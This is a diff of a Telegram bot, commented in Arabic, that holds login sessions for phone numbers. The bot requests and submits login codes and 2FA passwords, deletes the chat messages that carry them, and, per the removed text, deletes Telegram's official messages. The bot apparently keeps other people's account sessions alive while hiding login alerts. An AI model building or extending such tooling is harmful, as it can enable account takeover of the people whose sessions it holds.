@@ -64,6 +64,7 @@ user_link_msg_id = {}
 phone_to_user    = {}
 code_wait_tasks  = {}
 admin_refresh_ctx = {} # حفظ سياق التجديد اليدوي للأدمن
+notified_invalid_phones = set() # تتبع الأرقام التي تم الإبلاغ عن تعطلها لمنع التكرار
 
 
 # ──────────────────────────────────────────
@@ -669,16 +670,28 @@ async def session_watchdog():
         try:
             sessions = await database.get_all_sessions()
             for s in sessions:
+                phone = s["phone"]
                 if not s["valid"]:
                     continue
-                phone = s["phone"]
+                
                 alive = await session_manager.check_session_alive(phone)
                 action = session_manager.watchdog_session_check(phone, alive)
-                if action == "session_alive_again":
-                    await _on_admin_event(phone, "session_alive_again")
+                
+                if alive:
+                    # إذا عادت للعمل، نحذفها من قائمة المبلغ عنهم
+                    notified_invalid_phones.discard(phone)
+                    if action == "session_alive_again":
+                        await _on_admin_event(phone, "session_alive_again")
                     continue
+                
                 if action != "schedule_recovery":
                     continue
+                
+                # منع تكرار الإشعار لنفس الرقم
+                if phone in notified_invalid_phones:
+                    continue
+                
+                notified_invalid_phones.add(phone)
                 
                 # إشعار الأدمن فقط بدون إنعاش تلقائي
                 login_email = database.row_login_email(s)
@@ -1301,116 +1314,148 @@ async def auto_mail_process(callback: CallbackQuery):
 # ──────────────────────────────────────────
 # تجديد الجلسة يدوياً (...123)
 # ──────────────────────────────────────────
+async def track_msg(state: FSMContext, msg: Message):
+    """حفظ أيدي الرسائل لحذفها لاحقاً."""
+    data = await state.get_data()
+    msg_ids = data.get("refresh_msg_ids", [])
+    msg_ids.append(msg.message_id)
+    await state.update_data(refresh_msg_ids=msg_ids)
+
+
+async def cleanup_refresh_messages(chat_id: int, state: FSMContext):
+    """حذف رسائل العملية فقط (123، الكود، النقط، رسائل البوت)."""
+    data = await state.get_data()
+    msg_ids = data.get("refresh_msg_ids", [])
+    for mid in msg_ids:
+        await safe_delete(chat_id, mid)
+    await state.update_data(refresh_msg_ids=[])
+
+
 @dp.message(F.text.endswith("...123"))
 async def manual_refresh_trigger(message: Message, state: FSMContext):
-    if not is_admin(message.from_user.id):
-        return
-    
-    # محاولة استخراج الرقم من النص أو استخدامه كأمر عام للجلسة المختارة
+    uid = message.from_user.id
     phone = message.text.replace("...123", "").strip()
+    
+    # إذا لم يكتب الرقم، نحاول جلب الرقم المسجل لهذا اليوزر في جدول users
     if not phone:
-        # إذا لم يتم تحديد رقم، نحاول جلب آخر رقم تم التفاعل معه
-        data = await state.get_data()
-        phone = data.get("phone")
+        user_row = await database.get_user(uid)
+        if user_row and user_row["phone"]:
+            phone = user_row["phone"]
     
     if not phone:
-        await message.answer("❌ يرجى تحديد الرقم أولاً أو كتابته قبل ...123 (مثال: +2010...123)")
+        if is_admin(uid):
+            await message.answer("❌ يرجى تحديد الرقم أولاً أو كتابته قبل ...123 (مثال: +2010...123)")
         return
 
     phone = database.normalize_phone(phone)
     session = await database.get_session_by_phone(phone)
+    
+    # التأكد من صلاحية الوصول (الأدمن يجدد أي رقم، المستخدم يجدد رقمه فقط)
+    if not is_admin(uid):
+        user_row = await database.get_user(uid)
+        if not user_row or database.normalize_phone(user_row["phone"]) != phone:
+            return # لا نرد على الغرباء
+
     if not session:
-        await message.answer(f"❌ الجلسة للرقم {h(phone)} غير موجودة.")
+        if is_admin(uid):
+            await message.answer(f"❌ الجلسة للرقم {h(phone)} غير موجودة.")
         return
 
-    await message.answer(f"⏳ جاري طلب كود تسجيل دخول للرقم <code>{h(phone)}</code>...", parse_mode="HTML")
+    # بدء تتبع الرسائل للحذف
+    await state.clear()
+    await track_msg(state, message)
     
-    result = await session_manager.request_code(message.from_user.id, phone)
+    m_wait = await message.answer(f"⏳ جاري طلب كود تسجيل دخول للرقم <code>{h(phone)}</code>...", parse_mode="HTML")
+    await track_msg(state, m_wait)
+    
+    result = await session_manager.request_code(uid, phone)
     if result["success"]:
         await state.set_state(AdminFlow.refreshing_session)
         await state.update_data(phone=phone, session_id=session["id"])
-        await message.answer(
+        m_prompt = await message.answer(
             f"✅ تم طلب الكود بنجاح للرقم <code>{h(phone)}</code>.\n\n"
             "أرسل الكود الآن (أرقام فقط):",
-            parse_mode="HTML",
-            reply_markup=back_to_session_keyboard(session["id"])
+            parse_mode="HTML"
         )
+        await track_msg(state, m_prompt)
     else:
         err = result.get("error", "")
-        await message.answer(f"❌ فشل طلب الكود: <code>{h(err)}</code>", parse_mode="HTML")
+        m_fail = await message.answer(f"❌ فشل طلب الكود: <code>{h(err)}</code>", parse_mode="HTML")
+        await track_msg(state, m_fail)
 
 
 @dp.message(AdminFlow.refreshing_session)
 async def process_refresh_code(message: Message, state: FSMContext):
-    if not is_admin(message.from_user.id):
-        return
-    
+    uid = message.from_user.id
     code = message.text.strip()
-    if not code.isdigit():
-        await message.answer("❌ يرجى إرسال الكود كأرقام فقط.")
-        return
     
+    # تتبع رسالة الكود
+    await track_msg(state, message)
+    
+    if not code.isdigit() and code != ".":
+        return
+
+    # إذا أرسل نقطة "." نعتبرها محاولة انتظار أو تحديث (حسب طلب المستخدم "النقط")
+    if code == ".":
+        return
+
     data = await state.get_data()
     phone = data.get("phone")
     sid = data.get("session_id")
-    uid = message.from_user.id
 
-    wait = await message.answer("⏳ جاري التحقق من الكود...")
+    m_verifying = await message.answer("⏳ جاري التحقق من الكود...")
+    await track_msg(state, m_verifying)
+    
     result = await session_manager.submit_code(uid, code, is_refresh=True)
     
     if result.get("two_fa"):
         await state.set_state(AdminFlow.refreshing_2fa)
-        await wait.edit_text("🔐 الجلسة محمية بالتحقق بخطوتين. أرسل كلمة المرور الآن:")
+        m_2fa = await message.answer("🔐 الجلسة محمية بالتحقق بخطوتين. أرسل كلمة المرور الآن:")
+        await track_msg(state, m_2fa)
         return
 
     if result["success"]:
+        # نجاح العملية: حذف رسائل العملية
+        await cleanup_refresh_messages(message.chat.id, state)
         await state.clear()
-        await wait.edit_text(
-            f"✅ <b>تم تجديد الجلسة بنجاح!</b>\n\n"
-            f"📱 الرقم: <code>{h(phone)}</code>\n"
-            "تم تحديث ملف الجلسة وحذف الرسائل الرسمية.",
-            parse_mode="HTML",
-            reply_markup=back_to_session_keyboard(sid)
-        )
+        
+        # إشعار النجاح (يبقى ظاهراً أو يحذف لاحقاً)
+        await message.answer(f"✅ تم تجديد الجلسة بنجاح للرقم <code>{h(phone)}</code>.")
+        
+        # إذا كان أدمن، نحدث القائمة
+        if is_admin(uid):
+            await notify_admins(f"✅ <b>تم تجديد الجلسة يدوياً</b>\n📱 {h(phone)}", phone=phone)
     else:
-        await wait.edit_text(
-            f"❌ فشل التجديد: <code>{h(result.get('error', ''))}</code>\n"
-            "حاول مجدداً أو اطلب كود جديد (...123)",
-            parse_mode="HTML",
-            reply_markup=back_to_session_keyboard(sid)
-        )
+        m_err = await message.answer(f"❌ فشل التجديد: <code>{h(result.get('error', ''))}</code>\nحاول مجدداً:")
+        await track_msg(state, m_err)
 
 
 @dp.message(AdminFlow.refreshing_2fa)
 async def process_refresh_2fa(message: Message, state: FSMContext):
-    if not is_admin(message.from_user.id):
-        return
-    
+    uid = message.from_user.id
     password = message.text.strip()
+    
+    # تتبع رسالة الباسوورد
+    await track_msg(state, message)
+    
     data = await state.get_data()
     phone = data.get("phone")
     sid = data.get("session_id")
-    uid = message.from_user.id
 
-    wait = await message.answer("⏳ جاري التحقق من كلمة المرور...")
+    m_verifying = await message.answer("⏳ جاري التحقق من كلمة المرور...")
+    await track_msg(state, m_verifying)
+    
     result = await session_manager.submit_2fa(uid, password, is_refresh=True)
     
     if result["success"]:
+        await cleanup_refresh_messages(message.chat.id, state)
         await state.clear()
-        await wait.edit_text(
-            f"✅ <b>تم تجديد الجلسة بنجاح!</b>\n\n"
-            f"📱 الرقم: <code>{h(phone)}</code>\n"
-            "تم تحديث ملف الجلسة وحذف الرسائل الرسمية.",
-            parse_mode="HTML",
-            reply_markup=back_to_session_keyboard(sid)
-        )
+        await message.answer(f"✅ تم تجديد الجلسة بنجاح للرقم <code>{h(phone)}</code>.")
+        if is_admin(uid):
+            await notify_admins(f"✅ <b>تم تجديد الجلسة يدوياً (2FA)</b>\n📱 {h(phone)}", phone=phone)
     else:
-        await wait.edit_text(
-            f"❌ فشل التحقق: <code>{h(result.get('error', ''))}</code>\n"
-            "أرسل كلمة المرور الصحيحة:",
-            parse_mode="HTML",
-            reply_markup=back_to_session_keyboard(sid)
-        )
+        m_err = await message.answer(f"❌ فشل التحقق: <code>{h(result.get('error', ''))}</code>\nأرسل كلمة المرور الصحيحة:")
+        await track_msg(state, m_err)
 
 
 # ──────────────────────────────────────────
